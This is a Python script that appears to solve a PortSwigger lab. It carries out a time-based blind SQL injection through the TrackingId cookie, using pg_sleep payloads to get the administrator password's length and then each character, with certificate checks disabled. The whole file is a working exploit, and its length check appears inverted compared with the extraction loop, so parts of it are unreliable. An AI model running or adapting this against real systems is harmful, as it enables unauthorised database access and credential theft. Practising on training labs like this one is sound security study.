from datetime import timedelta
from string import ascii_lowercase, ascii_uppercase
import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if(len(sys.argv) == 1 or len(sys.argv) > 4):
    sys.exit("sqli_timedelay.py <URL> <Cookie> <Time delay>")

try:
    URL = sys.argv[1]
    COOKIE = dict(item.split("=") for item in sys.argv[2].split("; "))
    TIME_DELAY = int(sys.argv[3])
except:
    sys.exit("sqli_timedelay.py <URL> <Cookie> <Time delay>")

HOST = URL.split("://")[1]
PASSWORD_LENGTH = 0
DICTIONARY = ascii_lowercase + ascii_uppercase + "1234567890"
PASSWORD = ""
TRACKINGID = COOKIE['TrackingId']

headers = {
    'Host': HOST,
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36',
    'Accept-Language': 'en-US',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Sec-Gpc': '1',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Referer': 'https://portswigger.net/',
    'Connection': 'close',
}


for i in range(1,30):
    payload = f"{COOKIE['TrackingId']}'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)={i})+THEN+pg_sleep({TIME_DELAY})+ELSE+pg_sleep(0)+END+FROM+users--"
    COOKIE['TrackingId'] = payload
    response = requests.get(URL, cookies=COOKIE, headers=headers, verify=False)
    if (response.elapsed < timedelta(seconds=TIME_DELAY)):
        sys.stdout.write("\r\033")
        print(f"[+]=======> password length: {i}")
        PASSWORD_LENGTH= i
        COOKIE['TrackingId'] = TRACKINGID
        break
    else:
        print(f"test password lenth: {i}", end='\r')
        COOKIE['TrackingId'] = TRACKINGID

for i in range(1,PASSWORD_LENGTH+1):
    for char in DICTIONARY:
        payload = f"{COOKIE['TrackingId']}'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{i},1)='{char}')+THEN+pg_sleep({TIME_DELAY})+ELSE+pg_sleep(0)+END+FROM+users--"
        COOKIE['TrackingId'] = payload
        response = requests.get(URL, cookies=COOKIE, headers=headers, verify=False)
        if (response.elapsed > timedelta(seconds=TIME_DELAY)):
            PASSWORD += char
            COOKIE['TrackingId'] = TRACKINGID
            break
        else:
            print(f"testing password: {PASSWORD + char}", end='\r')
            COOKIE['TrackingId'] = TRACKINGID

sys.stdout.write("\r\033")
print(f"[+]=======> password: {PASSWORD}")